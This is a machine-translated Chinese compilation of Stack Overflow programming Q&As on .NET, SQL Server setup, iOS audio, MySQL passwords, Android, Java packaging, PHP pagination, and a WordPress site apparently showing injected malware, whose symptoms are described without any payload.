* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-07-21T09:41:10.560

我使用了比 Mikkel Hempel 改进的方法，无需使用预处理指令。

1.  创建一个标准的 .NET 类库，将其命名为 Models
2.  创建一个部分类，表示您要共享的内容

    ```
    public partial class Person
    {
        public int Id { get; set; }
        public string Name { get; set; }
    } 
    ```

3.  对于不可移植的代码（如 DataAnnotations），创建另一个部分类并使用元数据

    ```
    [MetadataTypeAttribute(typeof(Person.Metadata))]
    public partial class Person
    {
        internal sealed class Metadata
        {
            private Metadata() { } // Metadata classes shouldn't be instantiated

            // Add metadata attributes to perform validation
            [Required]
            [StringLength(60)]
            public string Name;
        }
    } 
    ```

4.  创建一个可移植类库，并从第 2 步“作为链接”添加类

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-06-10T15:40:04.610

当我需要跨多个平台的域项目时，我通常：

1.  为域代码创建标准 .NET 类库项目
2.  对于每个平台，我创建一个特定于平台的类库
3.  对于每个特定于平台的类库，我将标准 .NET 类库中的文件添加为链接（添加现有文件 -> 作为链接），因此当您编辑链接文件或原始文件时它们会自动更新。
4.  当我将一个新文件添加到 .NET 类库时，我将其添加为指向平台特定类库的链接。
5.  平台特定属性（即作为 DataAnnotations-assembly 一部分的 Table 和 ForeignKey）可以使用预处理器标签选择退出。假设我有一个带有类的 .NET 类库和带有链接文件的 Silverlight 项目，那么我可以通过执行以下操作来包含特定于 .NET 的属性：

    ```
    #if !SILVERLIGHT
    [Table("MyEntityFrameworkTable")]
    #endif 
    public class MyCrossPlatformClass 
    {
        // Blah blah blah
    } 
    ```

并且仅在 .NET 类库中包含 DataAnnotations 程序集。

我知道这比使用可移植类库需要更多的工作，但是您不能像上面的示例中那样选择退出 PCL 中的属性，因为您只允许引用共享程序集（同样 DataAnnotations 不允许）。

# sql-server - 请帮助我解决错误 27506 执行 SQL 脚本时出错

> ID：11917737
> 
> 赞同：3
> 
> 时间：2012-08-11T21:18:12.237
> 
> 标签：sql-server, installshield, sql-scripts

我正在尝试使用 InstallShield 2010 为使用 SQL Server 2008 的项目创建安装文件

一切正常，正在安装所有必要的程序，但是当我尝试安装我的项目时，它会给出这个错误

> *错误 27506。执行 SQL 脚本 dbName.sql 第 9 行
> 创建数据库失败。无法创建列出的某些文件名检查相关错误 (1802)*

我搜索它说我在SQL脚本中的路径不存在但是如何在程序本身的安装文件夹中创建数据库？

这是我的 SQL 脚本的前几行

```
USE [master]
GO

/****** Object:  Database [InventoryDB]    Script Date: 08/11/2012 19:01:00 ******/
CREATE DATABASE [InventoryDB] ON  PRIMARY 
( NAME = N'InventoryDB', FILENAME = N'C:\Inventory\DB\InventoryDB.mdf' , SIZE = 2048KB , MAXSIZE = UNLIMITED, FILEGROWTH = 1024KB )
 LOG ON 
( NAME = N'InventoryDB_log', FILENAME = N'C:\Inventory\DB\InventoryDB_log.ldf' , SIZE = 2816KB , MAXSIZE = 2048GB , FILEGROWTH = 10%)
GO

ALTER DATABASE [InventoryDB] SET COMPATIBILITY_LEVEL = 100
GO 
```

请帮忙

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T21:26:18.623

我认为您的安装应用程序应该在尝试在那里创建数据库之前创建路径 C:\INVENTORY\DB。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-07-01T16:46:46.940

我遇到了同样的问题。我重命名旧的 .mdf 和 .ldf 文件并开始工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-09T07:05:23.290

请确保 InventoryDB.mdf' 和 InventoryDB_log.ldf' 文件不存在。

还要确保 sql 帐户具有以下权限

securityadmin dbcreator db_owner 数据库角色成员资格

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-11-26T13:21:23.080

我通过检查可用的安装日志文件解决了我的问题。我的是目录中已经存在日志和 MDF 文件。删除这些文件，安装成功。

问候， 基兰

# core-audio - MusicDeviceMIDIEvent：iOS5.1 上的未知功能

> ID：11917741
> 
> 赞同：0
> 
> 时间：2012-08-11T21:18:33.357
> 
> 标签：core-audio, ios5.1, audiounit

我正在尝试使用 MusicSequence 来控制针对 iOS5.1 的 AUSampler 实例

该项目引用了项目编译和运行的 CoreAudio 和 AudioToolbox，但使用 Bad Access Xcode、“未知功能”AppCode 调用 MusicDeviceMIDIEvent 时出错。

我看到 API 发生了变化，而且 MusicDeviceMIDIEvent 现在存在于 AudioUnit 框架的 MusicDevice.h 中。

如果我尝试添加对 AudioUnit.framework 的引用，我理解该引用包含我得到“找不到框架 AudioUnit”的功能，并且项目无法构建。

SE 上的其他问题表明我应该在 AudioUnit 上使用 CoreAudio 和 AudioToolbox。

此外，我可以看到示例代码“LoadPresetDemo”在没有 AudioUnit 框架的情况下运行，但我不明白为什么。

任何建议或指示将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T23:49:49.447

要使用 MusicPlayer API，您只需将`AudioToolBox`框架添加到您的项目中，然后将 AudioToolbox.h 导入您的项目中：

```
#import <AudioToolbox/AudioToolbox.h> 
```

如果您查看该文件，您会看到它#includes 所有必要的位以使用 AUGraph 等。如果您需要做一些额外的事情，例如记录或访问 AUGraph 输出，那么您将需要导入其他框架。

我为使用 MusicPlayer API 的其他人发布了一个[演示项目](http://dl.dropbox.com/u/34715839/MusicPlayerTracksFromFiles.zip)——你可能会发现它很有用。

**更新：**

AudioToolbox 是一种方便的“瑞士军刀音频”类型的东西。如果您查看 AudioToolbox.h 它链接到 MusicPlayer.h 并且链接到一些核心音频 + 音频单元的东西。`MusicDeviceMIDIEvent`在 MusicPlayer.h 中定义，因此如果您在构建设置中包含了 AudioToolBox 框架，

我在这里有“LoadPresetDemo”示例。对于音频，它只包含 AudioToolbox 和 AVFoundation。作为现实检查，我删除了 AVFoundation 链接，编译并修复了导致的错误 - 所有这些都与设置音频会话和输出采样率等有关，然后我在模拟器中编译并运行它，它运行良好。我认为 Apple 包含了所有这些来演示如何处理音频应用程序进入和离开后台（参见`endInterruptionWithFlags`方法）。

无论如何...如果您已链接到 AudioToolBox 并导入 AudioToolbox.h 那么我不知道出了什么问题... ;-)

```
#define AUDIO_TOOLBOX_VERSION 1060

#include <Availability.h>
#include <TargetConditionals.h>
#if !defined(__COREAUDIO_USE_FLAT_INCLUDES__)
    #include <AudioToolbox/AudioFile.h>
    #include <AudioToolbox/AudioFileStream.h>
    #include <AudioToolbox/AudioFormat.h>
    #include <AudioToolbox/AudioQueue.h>
    #include <AudioToolbox/AudioServices.h>
    #include <AudioToolbox/AUGraph.h>
    #include <AudioToolbox/AudioConverter.h>
    #include <AudioToolbox/ExtendedAudioFile.h>
    #include <AudioToolbox/MusicPlayer.h>
    #include <AudioToolbox/CAFFile.h>
    #if !TARGET_OS_IPHONE
        #include <AudioToolbox/AudioFileComponent.h>
        #include <AudioToolbox/AudioUnitUtilities.h>
        #include <AudioToolbox/AUMIDIController.h>
        #include <AudioToolbox/CoreAudioClock.h>
    #endif
#else
    #include <AudioConverter.h>
    #include <AudioFile.h>
    #include <AudioFileComponent.h>
    #include <AudioFileStream.h>
    #include <AudioFormat.h>
    #include <AudioQueue.h>
    #include <AudioUnitUtilities.h>
    #include <AUGraph.h>
    #include <AUMIDIController.h>
    #include <CAFFile.h>
    #include <CoreAudioClock.h>
    #include <ExtendedAudioFile.h>
    #include <MusicPlayer.h>
    #include <AudioServices.h>
#endif 
```

* * *

```
// MusicPlayer.h
#include <Availability.h>
#if !defined(__COREAUDIO_USE_FLAT_INCLUDES__)
    #include <CoreAudio/CoreAudioTypes.h>
    #include <AudioUnit/AUComponent.h>
#else
    #include <CoreAudioTypes.h>
    #include <AUComponent.h>
#endif 
```

# mysql - Mac Mysql更改密码，没有用户表运行更新查询

> ID：11917742
> 
> 赞同：2
> 
> 时间：2012-08-11T21:18:34.420
> 
> 标签：mysql, macos, passwords, super

我可以使用 root 登录 - “无密码”，但我无法更改密码。我检查了很多链接，每个人都说要在用户表上运行更新查询，但我什至在 phpmyadmin 中找不到用户表。

我得到的错误是：

```
$ /usr/local/mysql/bin/mysqladmin -u root -p password
Enter password: 
New password: 
Confirm new password: 

/usr/local/mysql/bin/mysqladmin: Can't turn off logging; error: 'Access denied; you need (at least one of) the SUPER privilege(s) for this operation' 
```

任何帮助都将非常有用

PHP 我的管理员（截图）：[http ://awesomescreenshot.com/021cxa0fb](http://awesomescreenshot.com/021cxa0fb)

错误：http: [//i47.tinypic.com/1j1b0m.png](http://i47.tinypic.com/1j1b0m.png)

附加截图：http: [//i48.tinypic.com/w9vbtl.png](http://i48.tinypic.com/w9vbtl.png)

附加截图2：http: [//i48.tinypic.com/4rymps.png](http://i48.tinypic.com/4rymps.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T21:44:58.063

在我看来，您使用 phpmyadmin 来查找表。如果是这样，您将不会看到所有表格。您必须在终端中使用“mysql”命令以 root 身份登录 mysql：

```
$ mysql -u root 
```

然后您可以运行“更新用户...”-命令（您不必查看包含用户信息的表）

另一个想法：当你在命令行中使用 -p 时，你不能在它旁边写密码（它稍后会问你）。如果你在 -p 之后写一些东西，它会认为这是数据库名称......

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-11T22:18:11.640

从您在评论中发布的其他信息看来，您的 MySQL`root`用户在您的系统上不再具有 root 权限。在进行快速搜索后，`mysql reset root privileges`我发现这篇[博文](http://hack2live.blogspot.com/2009/04/restore-repair-reset-mysql-root.html)似乎提供了有关如何将 root 权限恢复到您的 root 帐户的详细说明。

请注意，我没有尝试过这些步骤，它们是从 2009 年开始的，从创建这些指令时开始，MySQL 可能在内部发生了变化。然而，话虽如此，帖子上的评论是正面的（当然，评论可能是假的）。

我的建议是备份包含所有 MySQL 数据的目录（或多个目录），然后按照它们的布局完全尝试这些步骤。

更仔细地查看这些说明，它们对我来说似乎是有效的。我注意到它们涉及关闭 MySQL 守护程序，使用关闭所有表安全性的选项重新启动 MySQL，然后执行更新以将权限添加回`root`用户。我现在建议尝试这些步骤。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-11T22:12:06.930

设置 root 的密码：

```
/usr/bin/mysqladmin -root password 'new-password' 
```

尝试知道mysql守护进程是否启动：

```
/usr/bin/mysqladmin -u root -p ping 
```

如果不活着尝试：

```
/etc/init.d/mysql start 
```

& 验证是否安装了 mcrypt 包。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-12T09:58:24.403

我解决了问题，谢谢大家。我按照以下指南重新安装了 mysql 服务器，问题是我使用更新查询将密码直接更新到 mysql.user 表，这是错误的，因为密码应该以加密形式存储在 mysql 中。用户表，如果我们直接通过查询更新它，那么它将是一个字符串。

[优秀的指南： http](http://blog.mclaughlinsoftware.com/2011/02/10/mac-os-x-mysql-install/) ://blog.mclaughlinsoftware.com/2011/02/10/mac-os-x-mysql-install/

再次感谢大家:)

# iphone - AVFoundation 框架错误

> ID：11917745
> 
> 赞同：0
> 
> 时间：2012-08-11T21:18:49.850
> 
> 标签：iphone, ios, avfoundation

> **可能重复：**
> [与静态库链接时，如何消除警告“文件是为不受支持的文件格式构建的”？](https://stackoverflow.com/questions/4917752/how-to-get-rid-of-the-warning-file-was-built-for-unsupported-file-format-when)

我写`#import <AVFoundation/AVFoundation.h>`在我的代码中，但是当我编译它时出现以下错误： 'AVFoundation/AVAsset.h' 文件未找到我还收到以下警告：

```
ld: warning: ignoring file /Volumes/Xcode/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS5.1.sdk/System/Library/Frameworks//AVFoundation.framework/AVFoundation, file was built for unsupported file format which is not the architecture being linked (armv7) 
```

请帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T21:21:19.643

您必须将 AVFoundation 框架添加到您的目标。在 Xcode 中选择您的项目，然后选择您的目标，单击“Build Phases”并展开“Link Binary with Libraries”。然后单击“+”并搜索 AVFoundation，添加它就可以了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T21:37:35.560

划掉我之前的答案，我找到了一个更有可能的解决方案。

我相信，当您将框架添加到项目中时，您会将其复制到项目中，而不是简单地将其链接到项目中。您应该从项目中删除框架，仅在必要时删除。然后再次添加框架。

如果您通过从 Finder 中拖放来添加它，请确保在处理 Xcode 时取消选中“复制”复选框。

# c# - 将 CheckedListBox 中的项目复制到 ListBox

> ID：11917749
> 
> 赞同：0
> 
> 时间：2012-08-11T21:19:04.987
> 
> 标签：c#, winforms, listbox, checkedlistbox

我正在尝试将 CheckedItems 从 a 复制`CheckedListBox`到 a `Listbox`，但我没有做对。

我努力了

```
Listbox.Items.Add(checkedlistbox.CheckedItems); 
```

但这只会给我一个（收藏）

有没有人有很棒的代码行可以分享？:D

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T21:22:32.467

这应该有效：

```
foreach(var Item in checkedlistbox.CheckedItems)
    Listbox.Items.Add(Item); 
```

编辑：用 var 替换字符串，因此它也适用于非字符串类型。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-07-05T22:02:42.597

```
 string item = checkedListBox1.SelectedItem.ToString();
if (e.NewValue == CheckState.Checked)
    listBox1.Items.Add(item);
else
    listBox1.Items.Remove(item); 
```

您应该将其写入 ItemCheck 事件中。使用此代码，您可以在另一个列表框中显示选中的项目。

# android - 在 Eclipse 中找不到源

> ID：11917752
> 
> 赞同：0
> 
> 时间：2012-08-11T21:19:19.027
> 
> 标签：android, eclipse

我正在用 Eclipse 构建一个 Android 应用程序，一切都很顺利，直到我添加了一个特定的 KeyEvent 代码。一旦我尝试模拟我的应用程序，它就会崩溃并死掉。我多次尝试清理它，但没有得到解决。此外，当我尝试编辑源路径时，源会显示片刻，但会消失。以下是未找到的来源：

```
ActivityThread.performLaunchActivity(ActivityThread$ActivityClientRecord, Intent) line: 2159    
ActivityThread.handleLaunchActivity(ActivityThread$ActivityClientRecord, Intent) line: 2189 
ActivityThread.access$600(ActivityThread, ActivityThread$ActivityClientRecord, Intent) line: 139    
ActivityThread$H.handleMessage(Message) line: 1261  
ActivityThread.main(String[]) line: 4894    
ZygoteInit$MethodAndArgsCaller.run() line: 784  
ZygoteInit.main(String[]) line: 551 
NativeStart.main(String[]) line: not available [native method] 
```

我怎样才能让它们变得可以使用？我非常接近我的应用程序准备就绪。这是我的应用程序中唯一的挫折。

编辑：这是 logcat 输出：

```
08-12 10:52:02.359: E/AndroidRuntime(23219): FATAL EXCEPTION: main
08-12 10:52:02.359: E/AndroidRuntime(23219): java.lang.RuntimeException: Unable to instantiate activity ComponentInfo{com.mshaw.avanos/com.mshaw.avanos.AvanosActivity}:       java.lang.NullPointerException
08-12 10:52:02.359: E/AndroidRuntime(23219):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2075)
08-12 10:52:02.359: E/AndroidRuntime(23219):    at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2189)
08-12 10:52:02.359: E/AndroidRuntime(23219):    at android.app.ActivityThread.access$600(ActivityThread.java:139)
08-12 10:52:02.359: E/AndroidRuntime(23219):    at  android.app.ActivityThread$H.handleMessage(ActivityThread.java:1261)
08-12 10:52:02.359: E/AndroidRuntime(23219):    at android.os.Handler.dispatchMessage(Handler.java:99)
08-12 10:52:02.359: E/AndroidRuntime(23219):    at android.os.Looper.loop(Looper.java:154)
08-12 10:52:02.359: E/AndroidRuntime(23219):    at android.app.ActivityThread.main(ActivityThread.java:4894)
08-12 10:52:02.359: E/AndroidRuntime(23219):    at java.lang.reflect.Method.invokeNative(Native Method)
08-12 10:52:02.359: E/AndroidRuntime(23219):    at java.lang.reflect.Method.invoke(Method.java:511)
08-12 10:52:02.359: E/AndroidRuntime(23219):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
08-12 10:52:02.359: E/AndroidRuntime(23219):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
08-12 10:52:02.359: E/AndroidRuntime(23219):    at dalvik.system.NativeStart.main(Native Method)
08-12 10:52:02.359: E/AndroidRuntime(23219): Caused by: java.lang.NullPointerException
08-12 10:52:02.359: E/AndroidRuntime(23219):    at com.mshaw.avanos.SimpleEula.getPackageInfo(SimpleEula.java:25)
08-12 10:52:02.359: E/AndroidRuntime(23219):    at com.mshaw.avanos.SimpleEula.show(SimpleEula.java:33)
08-12 10:52:02.359: E/AndroidRuntime(23219):    at com.mshaw.avanos.AvanosActivity.<init>(AvanosActivity.java:36)
08-12 10:52:02.359: E/AndroidRuntime(23219):    at java.lang.Class.newInstanceImpl(Native Method)
08-12 10:52:02.359: E/AndroidRuntime(23219):    at java.lang.Class.newInstance(Class.java:1319)
08-12 10:52:02.359: E/AndroidRuntime(23219):    at android.app.Instrumentation.newActivity(Instrumentation.java:1039)
08-12 10:52:02.359: E/AndroidRuntime(23219):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2066)
08-12 10:52:02.359: E/AndroidRuntime(23219):    ... 11 more 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-14T10:41:26.647

按照这些步骤
1) 转到您的调试视图
2) 在断点选项卡下，您将看到 NullPointerException
3) 右键单击​​并取消选中已捕获。
4）再次调试您的项目

希望这会帮助你。谢谢

# java - 导出的可运行 Jar 文件 - 我知道出了什么问题，但不知道如何修复

> ID：11917753
> 
> 赞同：0
> 
> 时间：2012-08-11T21:19:32.490
> 
> 标签：java, export, lwjgl, slick2d, unresolved-external

如何使用 slick 和 lwjgl（轻量级 Java 图形库）导出到可运行的 java 文件？

因此，我对此进行了一些研究，并相信我已经找到了问题的根源以及需要解决的问题，现在我需要弄清楚如何解决它。

我有一个使用 slick 和 lwjgl 的相当大的项目。这些都是作为 .jar 文件提供的，我已将它们添加到我的 IDE 中的 java 构建路径中（Eclipse INDIGO，如果您想知道的话）。

我的目标是将片段导出到一个可运行的 jar 文件中。Eclipse 为此提供了三个选项：

*   将所需的库提取到生成的 JAR 中
*   将所需的库打包到生成的 JAR 中
*   将所需的复制到生成的 JAR 旁边的子文件夹中

我一直在寻找第二种选择，这似乎是最容易从逻辑上处理的。无论如何，当我选择此选项时，我按下 FINISH 选项（除了 BACK 和 CANCEL 之外唯一可用的选项）我会弹出生成进度一秒钟，一切看起来都很好。但是，如果我运行生成的文件，我会得到一个未解决的链接器错误，因为它找不到 lwjgl。

当使用 winRar 查看时，slick.jar 和 lwgjl.jar 都在生成的 JAR 中，我假设当一切从 IDE 转到可运行的 JAR 时，有关 java 构建路径的一些信息正在丢失。

到目前为止，我的研究似乎表明我可以通过 manifest.txt 文件中的某些内容将生成的 JAR 指向它需要的随附文件，但这是我一直无法找到更具体的内容。

谁能告诉我从这里去哪里？

PS：我已经尝试了构建路径的几乎所有导出选项和环境选项的排列，但是当我运行生成的 JAR 时，它会出现各种不同的错误，这些错误仍然意味着“我在外部找不到这个”。

PPS：我忘了补充，在manifest文件中提到了eclipse本身如下：

```
Manifest-Version: 1.0
Rsrc-Class-Path: ./ lwjgl.jar slick.jar
Class-Path: . lwjgl.jar slick.jar
Rsrc-Main-Class: Game.Game 
Main-Class: org.eclipse.jdt.internal.jarinjarloader.JarRsrcLoader 
```

每一点常识都告诉我需要更改，因为它指的是 .jars 的位置，但同样，不确定从什么开始或从哪里开始。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-12T18:17:57.223

您可以使用[JarSplice](http://ninjacave.com/jarsplice)，只需从 Eclipse 导出 jar 以及您的类和资源（此时不包括任何库），然后使用 JarSplice 添加任何库和本机（如 lwjgl 和 slick）并使 jar 可运行。

# android - 在 Android 4 中更改首选项项目摘要文本颜色

> ID：11917770
> 
> 赞同：12
> 
> 时间：2012-08-11T21:23:11.570
> 
> 标签：android, colors, themes, preference

我有以下偏好项目示例

```
 <CheckBoxPreference
     android:key="chkSound"
     android:summary="Sound is Off"
     android:title="Sound" /> 
```

我在 res/values 中使用主题来更改摘要文本颜色

```
 <style name="ThemeDarkText">
    <item name="android:textColor">#000000</item>
  </style> 
```

在代码中我写了这一行

```
 setTheme(R.style.ThemeDarkText); 
```

它在 Android 2.1 中运行良好，但是当我尝试在不同的操作系统（例如 Android 4.0）上运行它时，它并没有改变摘要文本颜色，只是标题颜色..！！

有什么帮助吗？

* * *

## 回答 #1

> 赞同：40
> 
> 时间：2012-09-13T21:36:42.790

我在这里遇到了同样的问题。

有趣的是，Edit Preference 的摘要颜色正确 - 红色，但 Checkbox 和 PreferenceScreen 是白色的。

这是我的解决方案：

将此添加到主题中的 style.xml：

```
<item name="android:textColorSecondary">@color/your_color</item> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-08-23T00:56:18.853

对于那些使用`Theme.AppCompat`(Lollipop) 的人，这是由

`<item name="colorAccent">@color/accent</item>`

# vb.net - 视图中的多模型（非转换错误）

> ID：11917771
> 
> 赞同：0
> 
> 时间：2012-08-11T21:23:21.353
> 
> 标签：vb.net, asp.net-mvc-3

我真的很难让我加入的两个表在视图中显示（我只想显示来自客户表的客户名称和来自账单表的账单状态 - 这两个表都在 CustomerId 主键上）。我花了很长时间研究这个并得出结论，为这个视图创建另一个模型，但是当我尝试使用以下内容时，我在我的控制器中做了：

```
Function ShowAll() As ViewResult
    Dim BillQuery = From d In db.Bills
                    Join c In db.Customers On d.CustomerId Equals c.CustomerId
                    Select c.CustSurname, d.BillStatus

    Dim BillList As List(Of BillView) = BillQuery.ToList()

    Return View(BillList)
End Function 
```

我收到一个错误：

'System.Collections.Generic.List(Of )' 类型的值无法转换为 'System.Collections.Generic.List(Of Laundry.BillView)'

这是我的 Bill 和 BillView 模型：

```
Imports System.Data.Entity
Imports System.ComponentModel.DataAnnotations

Public Class Bill

    'Key
    Public Property BillId() As Integer

    'Others
    <Required()>
    <Display(Name:="Customer ID")>
    Public Property CustomerId() As String

    <Required()>
    <Display(Name:="Bill Status")>
    Public Property BillStatus() As String

End Class

Public Class BillView

    Public Property CustSurname() As String

    Public Property BillStatus() As String

End Class 
```

和客户模型：

```
Imports System.Data.Entity
Imports System.ComponentModel.DataAnnotations

Public Class Customer

'Key
Public Property CustomerId() As Integer

'Others
<Display(Name:="Group ID")>
Public Property GroupId() As Integer

<Required()>
<Display(Name:="Firstname")>
Public Property CustFirstname() As String

<Required()>
<Display(Name:="Surname")>
Public Property CustSurname() As String

<Display(Name:="Email")>
Public Property CustEmail() As String

<Display(Name:="Cellphone")>
Public Property CustCellphone() As String

<Display(Name:="Address")>
Public Property CustAddress() As String

<Required()>
<Display(Name:="Status")>
Public Property CustStatus() As String

<Required()>
<Display(Name:="Account Balance")>
Public Property AccBalance() As Double

<Required()>
<Display(Name:="Loyalty Ammount")>
Public Property LoyaltyAmount() As Double

<Required()>
<Display(Name:="Customer Discount")>
Public Property PersonalDiscount() As Double

End Class 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T22:20:10.497

看起来您的第一个 LINQ 查询正在返回一个匿名类型，该类型随后无法转换为`List(Of BillView)`. 尝试使用以下代码在强制转换`BillView`之前返回模型集合（注意添加的语法`Select New BillView With {}`）。

```
Function ShowAll() As ViewResult
    Dim BillQuery = From d In db.Bills
                    Join c In db.Customers On d.CustomerId Equals c.CustomerId
                    Select New BillView With {.CustSurname = c.CustSurname, .BillStatus =  d.BillStatus}

    Dim BillList As List(Of BillView) = BillQuery.ToList()

    Return View(BillList)
End Function 
```

# php - 截断分页中的页数

> ID：11917775
> 
> 赞同：0
> 
> 时间：2012-08-11T21:23:53.667
> 
> 标签：php, pagination

这可能是一个非常愚蠢的问题，但我想不出任何可以帮助我更进一步的东西。我希望在我的页面导航中缩短 NUMBERS 的数量。

而不是像：*1、2、3、4、5、6、7、8*

我希望它像：*1、2...7、8*

当我转到**2**时，现在应该在数字组中看到数字**3 。**

这是我负责页码的代码：

```
<div id="user_nav_bottom">
<?php for($i=1; $i < sizeof($pages)+1; $i++) {
    $strong = ($_GET['page'] == $i) ? ' dark bold' : '';
    echo '<span class="normal' . $strong . '"><a href="imgit_images.php?page=' . $i . '">' . $i . ', </a></span>';
} ?>
</div> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T21:42:51.167

这是我为分页论坛编写的一段修改过的代码。

它的输出并不完全是你所展示的，而应该只是一个调整的问题。

```
<?php 
    //Set up vars

    $currentPage = isset($_GET["page"])? $_GET["page"] : 1;
    $numPages = count($pages);
    $numPages = 7;//cause I don't have the real var for testing

    $howMany = 1;
?>

<?php if ($numPages > 1): ?>
    <li>Page <?php echo $currentPage?> of <?php echo $numPages?></li>
    <?php if ($currentPage > 1): ?>
        <li><a href="imgit_images.php?page=1">First</a></li>
        <li><a href="imgit_images.php?page=<?php echo $currentPage-1?>">&lt;</a></li>
    <?php endif; ?>

    <?php if ($currentPage > $howMany + 1): ?>
        <li>...</li>
    <?php endif; ?>

    <?php for ($pageIndex = $currentPage - $howMany; $pageIndex <= $currentPage + $howMany; $pageIndex++): ?>
        <?php if ($pageIndex >= 1 && $pageIndex <= $numPages): ?>
            <li>
                <?php if ($pageIndex == $currentPage): ?>
                    <u>
                <?php endif; ?>

                <a href="imgit_images.php?page=<?php echo $pageIndex?>"><?php echo $pageIndex?></a>

                <?php if ($pageIndex == $currentPage): ?>
                    </u>
                <?php endif; ?>
            </li>
        <?php endif; ?>
    <?php endfor; ?>

    <?php if ($currentPage < $numPages - $howMany): ?>
        <li>...</li>
    <?php endif; ?>

    <?php if ($currentPage < $numPages): ?>
        <li><a href="imgit_images.php?page=<?php echo $currentPage+1?>">&gt;</a></li>
        <li><a href="imgit_images.php?page=-1">Last</a></li>
    <?php endif; ?>
<?php endif; ?> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-11T21:46:46.487

看看这个：[https](https://codereview.stackexchange.com/a/10292) ://codereview.stackexchange.com/a/10292 。此解决方案应该可以解决您的问题。我认为这是一个非常好的方法。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-11T22:24:32.590

这个显示了当前请求的链接之前的两个链接和之后的两个链接：

```
<div id="user_nav_bottom">
<?php
$current = $_GET['page'];
$last = count($pages)+1;
$curr0 = $current-2;
$curr1 = $current+2;
if ($curr0<=1) {
  $curr0 = 1;
  $curr1 = $last>5? 5 : $last;
}
if ($curr1>=$last) {
  $curr0 = $last-4 < 1 ? 1 : $last-4;
  $curr1 = $last;
}
// now print all links:
echo '<a href="imgit_images.php?page=1">&#171;</a> ';
for ($i=$curr0; $i<=$curr1; $i++) {
  $style = ($i==$current)? 'font-weight:bold':'';
  echo ' <a href="imgit_images.php?page='.$i.'" style="'.$style.'">'.$i.'</a> ';
}
echo '<a href="imgit_images.php?page='.$last.'">&#187;</a> ';
?>
</div> 
```

这显示了这样的链接： « 13 14 **15** 16 17 »
恕我直言，通过添加适当的条件来添加前五个和后五个链接并不难。

[测试脚本在这里](http://pastebin.com/BT137NHx)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-07T15:37:44.330

您可能想要做的是使用我在此处的回答中描述的“对数”分页技术：

[如何为很多很多页面进行页面导航？对数页面导航](https://stackoverflow.com/q/7835752/999120)

如果将 LINKS_PER_STEP 设置为像 2 或 3 这样的低值，它将产生非常紧凑的输出。

# wordpress - wordpress 中的“找不到数据库 jimbob_je”恶意软件注入消息。如何去除？

> ID：11917776
> 
> 赞同：0
> 
> 时间：2012-08-11T21:23:55.813
> 
> 标签：wordpress, code-injection, malware, encryption

我在 wordpress 网站上有这条消息：

> 无法连接到数据库服务器。找不到数据库 jimbob_je。应用程序出现意外问题。选择 statscurl_id 从`statscurl`哪里 statscurl_ip = '';

我已经使用**sucuri.net**进行了检查，但它没有找到任何东西，但仍然出现错误。我从浏览器中检查了页面源，并且在结束标头标记上方有 2 个加密脚本，但我在 header.php 中找不到它们。

这两个脚本在开头有**“eval(unescape” )，当页面加载到状态栏中时，会出现 2 个站点：** **wscripts.org**和**jquery.com** 此外，当使用**Firebug**检查加载的脚本时，有 2 个称为**pop.js**和**imwb_cab_script。 js**，但它们没有加密并且来自上面提到的站点。两者都是随机加载的。

这是**imwb_cab_script.js的代码**

```
jQuery(document).ready(function($) {
// $() will work as an alias for jQuery() inside of this function
imwb_activate_cab();
$('.imwb_cabar').live('click', function() {
var data = {
action :'imwb_cab_ctr_action',
barDetails: $(this).attr('id'),
nonce : IMWB_CAB_Ajax.nonce
};
$.ajax({
async: false,
type: 'POST',
url: IMWB_CAB_Ajax.ajaxurl,
data: data
});
imwb_goto_cab_link();
return true;
});
});
var cabCookie = function(name, value, expireHours, path) {
// name and at least value given, set cookie...
if (arguments.length > 1 ) {
if (expireHours === null || expireHours === undefined) {
expireHours = 7; 
```

另一个代码脚本**pop.js**是：

```
